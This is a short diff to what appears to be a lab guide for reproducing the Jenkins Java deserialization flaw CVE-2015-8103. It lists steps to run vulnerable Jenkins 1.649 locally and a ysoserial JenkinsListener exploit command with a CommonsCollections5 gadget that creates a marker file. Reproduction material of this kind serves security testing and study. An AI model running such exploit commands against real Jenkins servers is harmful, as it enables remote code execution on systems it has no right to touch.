@@ -24,7 +24,7 @@ References:
 Jenkins (CVE-2015-8103)
 ---------------------------------
 
-- Download a vulnerable version of Jenkins (in this case you can find the v1. 
+- Download a vulnerable version of Jenkins (in this case you can find the v1.649
 - Check if you have installed the JDK 1.8
 - java -jar ./jenkins-war-1.649.war
 - java -cp ysoserial-master-v0.0.5-gb617b7b-16.jar ysoserial.exploit.JenkinsListener http://localhost:8080 CommonsCollections5 "touch /tmp/JenkinsVulnerable.txt"
